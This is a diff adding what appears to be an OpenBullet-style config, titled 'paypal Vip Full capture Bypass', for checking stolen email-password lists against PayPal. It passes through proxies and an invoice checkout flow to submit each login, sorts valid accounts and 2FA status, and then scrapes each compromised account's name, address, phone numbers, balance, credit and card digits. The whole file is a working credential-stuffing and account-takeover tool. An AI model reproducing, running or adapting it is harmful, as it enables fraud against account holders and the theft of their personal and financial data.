@@ -1,0 +1,325 @@
+[SETTINGS]
+{
+  "Name": "paypal V2 Login + Full capture",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2023-03-10T04:56:11.608968-08:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@bakatou",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "paypal Vip Full capture Bypass",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+!#1 REQUEST GET "https://www.paypal.com/invoice/payerView/details/INV2-868C-83MK-45J3-BMDX?locale.x=en_US&v=1&utm_source=unp&utm_medium=email&utm_campaign=RT000238&utm_unptid=bc68b168-1d3c-11ed-9c5a-40a6b729070d&ppid=RT000238&cnac=C2&rsta=en_US%28en-CN-xbord%29&cust=&unptid=bc68b168-1d3c-11ed-9c5a-40a6b729070d&calc=f635838537478&unp_tpcid=invoice-buyer-notification&page=main%3Aemail%3ART000238&pgrp=main%3Aemail&e=cl&mchn=em&s=ci&mail=sys&appVersion=1.107.0&xt=104038" 
+!  
+!  HEADER ": scheme: https" 
+!  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+!  HEADER "accept-encoding: gzip, deflate, br" 
+!  HEADER "accept-language: en-US;q=0.9" 
+!  HEADER "sec-fetch-dest: document" 
+!  HEADER "sec-fetch-mode: navigate" 
+!  HEADER "sec-fetch-site: none" 
+!  HEADER "sec-fetch-user: ?1" 
+!  HEADER "sec-gpc: 1" 
+!  HEADER "upgrade-insecure-requests: 1" 
+!  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36" 
+
+#U FUNCTION URLEncode "<USER>" -> VAR "U" 
+
+#P FUNCTION URLEncode "<PASS>" -> VAR "P" 
+
+#2 REQUEST GET "https://www.paypal.com/invoice/s/pay/INV2-868C-83MK-45J3-BMDX?locale.x=en_US&v=1&utm_source=unp&utm_medium=email&utm_campaign=RT000238&utm_unptid=bc68b168-1d3c-11ed-9c5a-40a6b729070d&ppid=RT000238&cnac=C2&rsta=en_US%28en-CN-xbord%29&cust=&unptid=bc68b168-1d3c-11ed-9c5a-40a6b729070d&calc=f635838537478&unp_tpcid=invoice-buyer-notification&page=main%3Aemail%3ART000238&pgrp=main%3Aemail&e=cl&mchn=em&s=ci&mail=sys&appVersion=1.107.0&xt=104038" AutoRedirect=FALSE 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US;q=0.9" 
+  HEADER "cookie: nsid=s%3A5u1LhMUj2PUe9O2UPBTQ8VsWv8H62Flp.8JyjYCexWrAQxcfGjQJj5OQ6fqxpNgL%2FMnZOZhfcSQA; enforce_policy=ccpa; LANG=en_US%3BUS; l7_az=dcg15.slc; ts_c=vr%3Ded47dc931840ad009222f841fc2f8a6b%26vt%3Ded47dc931840ad009222f841fc2f8a6a; TLTSID=96446750043794685984889634070835; ts=vreXpYrS%3D1765122621%26vteXpYrS%3D1670430021%26vr%3Ded47dc931840ad009222f841fc2f8a6b%26vt%3Ded47dc931840ad009222f841fc2f8a6a%26vtyp%3Dnew; tsrce=invoicingnodeweb; cookie_prefs=P%3D1%2CF%3D1%2Ctype%3Dimplicit; x-pp-s=eyJ0IjoiMTY3MDQyODIyMTQwMSIsImwiOiIwIiwibSI6IjAifQ" 
+  HEADER "referer: https://www.paypal.com/invoice/payerView/details/INV2-868C-83MK-45J3-BMDX?locale.x=en_US&v=1&utm_source=unp&utm_medium=email&utm_campaign=RT000238&utm_unptid=bc68b168-1d3c-11ed-9c5a-40a6b729070d&ppid=RT000238&cnac=C2&rsta=en_US%28en-CN-xbord%29&cust=&unptid=bc68b168-1d3c-11ed-9c5a-40a6b729070d&calc=f635838537478&unp_tpcid=invoice-buyer-notification&page=main%3Aemail%3ART000238&pgrp=main%3Aemail&e=cl&mchn=em&s=ci&mail=sys&appVersion=1.107.0&xt=104038" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36" 
+
+#csrf PARSE "<SOURCE>" LR "id=\"_csrf\" value=\"" "\"" -> VAR "csrf" 
+
+#create REQUEST POST "https://www.paypal.com/invoice/s/pay/create-cart/INV2-868C-83MK-45J3-BMDX" 
+  CONTENT "{\"payment_option\":\"FULL_AMOUNT\",\"custom_amount\":\"\",\"gratuity_amount\":\"\",\"gratuity_type\":\"amount\",\"payment_for\":\"Payment for invoice 0003\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "authority: www.paypal.com" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cookie: nsid=s%3A5u1LhMUj2PUe9O2UPBTQ8VsWv8H62Flp.8JyjYCexWrAQxcfGjQJj5OQ6fqxpNgL%2FMnZOZhfcSQA; enforce_policy=ccpa; LANG=en_US%3BUS; l7_az=dcg15.slc; ts_c=vr%3Ded47dc931840ad009222f841fc2f8a6b%26vt%3Ded47dc931840ad009222f841fc2f8a6a; TLTSID=96446750043794685984889634070835; cookie_prefs=P%3D1%2CF%3D1%2Ctype%3Dimplicit; x-pp-s=eyJ0IjoiMTY3MDQyODIzMzExMiIsImwiOiIwIiwibSI6IjAifQ; tsrce=authchallengenodeweb; ts=vreXpYrS%3D1765122755%26vteXpYrS%3D1670430155%26vr%3Ded47dc931840ad009222f841fc2f8a6b%26vt%3Ded47dc931840ad009222f841fc2f8a6a%26vtyp%3Dnew; tcs=invoicingnodeweb%2F.dust%7Cppvx_btn___5-12-1%20payment-button" 
+  HEADER "origin: https://www.paypal.com" 
+  HEADER "referer: https://www.paypal.com/invoice/s/pay/INV2-868C-83MK-45J3-BMDX?locale.x=en_US&v=1&utm_source=unp&utm_medium=email&utm_campaign=RT000238&utm_unptid=bc68b168-1d3c-11ed-9c5a-40a6b729070d&ppid=RT000238&cnac=C2&rsta=en_US%28en-CN-xbord%29&cust=&unptid=bc68b168-1d3c-11ed-9c5a-40a6b729070d&calc=f635838537478&unp_tpcid=invoice-buyer-notification&page=main%3Aemail%3ART000238&pgrp=main%3Aemail&e=cl&mchn=em&s=ci&mail=sys&appVersion=1.107.0&xt=104038" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36" 
+  HEADER "x-csrf-token: <csrf>" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"token\":\"" 
+
+#tok PARSE "<SOURCE>" JSON "token" -> VAR "tok" 
+
+#uri PARSE "<SOURCE>" JSON "redirectUri" -> VAR "uri" 
+
+#redirect REQUEST GET "https://www.paypal.com<uri>" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-gpc: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36" 
+
+#sessionID PARSE "<SOURCE>" LR "_sessionID\" value=\"" "\"" -> VAR "sessionID" 
+
+#csrf1 PARSE "<SOURCE>" LR "_csrf\" value=\"" "\"" EncodeOutput=TRUE -> VAR "csrf1" 
+
+#ctx PARSE "<SOURCE>" LR "name=\"ctxId\" value=\"" "\"" -> VAR "ctx" 
+
+#flowid PARSE "<SOURCE>" LR "name=\"flowId\" value=\"" "\"" -> VAR "flowid" 
+
+#ads PARSE "<SOURCE>" LR "name=\"ads-client-context-data\" value=\"" "\"" -> VAR "ads" 
+
+#ads FUNCTION Replace "&quot;" "\"" "<ads>" -> VAR "ads" 
+
+#ads FUNCTION URLEncode "<ads>" -> VAR "ads" 
+
+#redurl PARSE "<SOURCE>" LR "requestUrl\" value=\"" "\"" -> VAR "redurl" 
+
+#redurl FUNCTION Replace "&amp;" "&" "<rurl>" -> VAR "redurl" 
+
+#redurl FUNCTION URLEncode "<rurl>" -> VAR "redurl" 
+
+#state PARSE "<SOURCE>" LR "name=\"state\" value=\"" "\"" -> VAR "state" 
+
+#state FUNCTION Replace "&amp;" "&" "<state>" -> VAR "state" 
+
+#state FUNCTION URLEncode "<state>" -> VAR "state" 
+
+#sign REQUEST POST "https://www.paypal.com/signin?intent=checkout&ctxId=xo_ctx_<tok>&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26token%3D<tok>%26useraction%3Dcommit%26rcache%3D1%26cookieBannerVariant%3Dhidden%26targetService4174%3Dhermesnodeweb&locale.x=en_US&country.x=US&flowId=<tok>" AutoRedirect=FALSE 
+  CONTENT "_csrf=<csrf1>&_sessionID=<sessionID>&locale.x=en_US&processSignin=main&fn_sync_data=%257B%2522SC_VERSION%2522%253A%25222.0.1%2522%252C%2522syncStatus%2522%253A%2522data%2522%252C%2522f%2522%253A%25228U4759585D762203X%2522%252C%2522s%2522%253A%2522UL_CHECKOUT_INPUT_PASSWORD%2522%252C%2522chk%2522%253A%257B%2522ts%2522%253A1670448690022%252C%2522eteid%2522%253A%255B4710722875%252C2391713966%252C3203944742%252C-2338522056%252C2862925448%252C4769770549%252Cnull%252Cnull%255D%252C%2522tts%2522%253A4280%257D%252C%2522dc%2522%253A%2522%257B%255C%2522screen%255C%2522%253A%257B%255C%2522colorDepth%255C%2522%253A24%252C%255C%2522pixelDepth%255C%2522%253A24%252C%255C%2522height%255C%2522%253A768%252C%255C%2522width%255C%2522%253A1366%252C%255C%2522availHeight%255C%2522%253A728%252C%255C%2522availWidth%255C%2522%253A1366%257D%252C%255C%2522ua%255C%2522%253A%255C%2522Mozilla%252F5.0%2520%28Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%29%2520AppleWebKit%252F537.36%2520%28KHTML%252C%2520like%2520Gecko%29%2520Chrome%252F101.0.0.0%2520Safari%252F537.36%255C%2522%257D%2522%252C%2522d%2522%253A%257B%2522ts1%2522%253A%2522Dk000%253A2534Uk000%253A2Uh%253A1027Uh%253A1476%2522%252C%2522rDT%2522%253A%252215684%252C15624%252C15382%253A25932%252C25870%252C25639%253A31058%252C30990%252C30760%253A31059%252C30987%252C30749%253A20813%252C20737%252C20508%253A5444%252C5362%252C5157%253A10567%252C10479%252C10260%253A36182%252C36091%252C35881%253A15690%252C15596%252C15381%253A36181%252C36085%252C35878%253A41301%252C41204%252C40999%253A10560%252C10461%252C10265%253A15679%252C15580%252C15381%253A5431%252C5332%252C5132%253A51536%252C51439%252C51246%253A10548%252C10457%252C10261%253A15668%252C15582%252C15387%253A51527%252C51444%252C51238%253A15664%252C15584%252C15384%253A25907%252C25832%252C25631%253A18182%252C34%2522%257D%257D&intent=checkout&ads-client-context=checkout&flowId=8U4759585D762203X&ads-client-context-data=<ads>&ctxId=<ctx>&isValidCtxId=true&coBrand=us&signUpEndPoint=%2Fwebapps%2Fmpp%2Faccount-selection&showCountryDropDown=true&isSplitLoginVariant=true&hideOtpLoginCredentials=true&tofOptimizationOtpLoginEnabled=true&requestUrl=<redurl>&forcePhonePasswordOptIn=&returnUri=%2Fwebapps%2Fhermes&state=<state>&login_email=<U>&captchaCode=&initialSplitLoginContext=inputEmail&isTpdOnboarded=&login_password=<P>&captcha=&splitLoginContext=inputPassword&otpMayflyKey=f729507fbdc6407ba1366956c2d3c815otpChlg&legalCountry=US&partyIdHash=ca160869110466ce57d1eb819e0f8778a5f6fdf163ce9299078ba7a5585e2a5c" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: no-cache" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://www.paypal.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: <uri>" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"101\", \"Google Chrome\";v=\"101\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36" 
+
+IF "<HEADERS(Location)>" contains "authflow/entry/"
+
+PARSE "<HEADERS(Location)>" LR "" "" -> VAR "r_flow" 
+
+REQUEST GET "https://www.paypal.com<r_flow>" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-type: application/json" 
+  HEADER "referer: https://www.paypal.com/invoice/s/create" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+FUNCTION Constant "TRUE" -> CAP "Security Check" 
+
+#status PARSE "<SOURCE>" LR "\"status\":\"" "\"" CreateEmpty=FALSE -> CAP "status" 
+
+#country PARSE "<SOURCE>" LR "\"country\":\"" "\"" CreateEmpty=FALSE -> CAP "country" 
+
+#Type PARSE "<SOURCE>" JSON "type" CreateEmpty=FALSE -> CAP "Type" 
+
+#Number PARSE "<SOURCE>" LR "\"value\":\"‪" "\"" CreateEmpty=FALSE -> CAP "Number" 
+
+FUNCTION Constant "FALSE" -> CAP "2FA ENALED" 
+
+SET STATUS SUCCESS
+JUMP #author
+ENDIF
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Found. Redirecting to <a href=\"https://www.paypal.com/webapps/hermes?flow=1-P&amp;ulReturn=true&amp;token=EC" 
+    KEY "href=\"https://www.paypal.com/webapps" 
+    KEY "<HEADERS(Location>" Contains "webapps/hermes" 
+  KEYCHAIN Retry OR 
+    KEY "CSRF token mismatch" 
+    KEY "We're sorry, we're having some trouble completing " 
+  KEYCHAIN Failure OR 
+    KEY "Some of your info didn't match" 
+    KEY "LoginFailed" 
+    KEY "For security reasons, you’ll need" 
+    KEY "Some of your information isn't correct" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Redirecting to <a href=\"/authflow/safe/" 
+  KEYCHAIN Custom "2FA ENABLED" OR 
+    KEY "authflow/twofactor" 
+
+REQUEST GET "https://www.paypal.com/invoice/s/invoice-model/?template=" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-type: application/json" 
+  HEADER "referer: https://www.paypal.com/invoice/s/create" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+PARSE "<SOURCE>" LR "countryName\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+PARSE "<SOURCE>" LR "\"line1\":\"" "\"" CreateEmpty=FALSE -> CAP "Address" 
+
+PARSE "<SOURCE>" LR "\"city\":\"" "\"" CreateEmpty=FALSE -> CAP "City" 
+
+PARSE "<SOURCE>" LR "\"state\":\"" "\"" CreateEmpty=FALSE -> CAP "State" 
+
+PARSE "<SOURCE>" LR "\"postcode\":\"" "\"" CreateEmpty=FALSE -> CAP "Zip" 
+
+PARSE "<SOURCE>" LR "{\"first_name\":\"" "\"" -> VAR "FN" 
+
+PARSE "<SOURCE>" LR "last_name\":\"" "\"" -> VAR "LN" 
+
+FUNCTION Constant "<FN> <LN>" -> CAP "Full Name" 
+
+PARSE "<SOURCE>" LR "country_code\":\"" "\"}" -> VAR "CD" "+" "" 
+
+PARSE "<SOURCE>" LR "\"national_number\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Phone Number(s)" "<CD>" "" 
+
+REQUEST GET "https://www.paypal.com/myaccount/money/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Host: www.paypal.com" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://www.paypal.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Cache-Control: no-cache" 
+
+PARSE "<SOURCE>" LR "\"totalAvailable\":{\"amount\":\"" "\",\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Balance" 
+
+PARSE "<SOURCE>" LR "class=\"fiListItem-amount ppvx_text--caption \">" "</span>" Recursive=TRUE CreateEmpty=FALSE -> CAP "Credit" 
+
+#Cards PARSE "<SOURCE>" LR "lastDigits\":\"" "\"" Recursive=TRUE -> CAP "Cards" "[" "]" 
+
+#Cards_Data PARSE "<SOURCE>" LR "\"issuerProductDescription\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Cards Data" "[" "]" 
+
+#Dashboard REQUEST GET "https://www.paypal.com/restore/dashboard" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-gpc: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" 
+
+IF "<SOURCE>" Contains "Your account access is temporarily limited" 
+SET CAP "Limited" "True"
+ELSE
+SET CAP "Limited" "False" 
+ENDIF
+
+#author FUNCTION Constant "@Bakatou" -> CAP "Config By" 
+
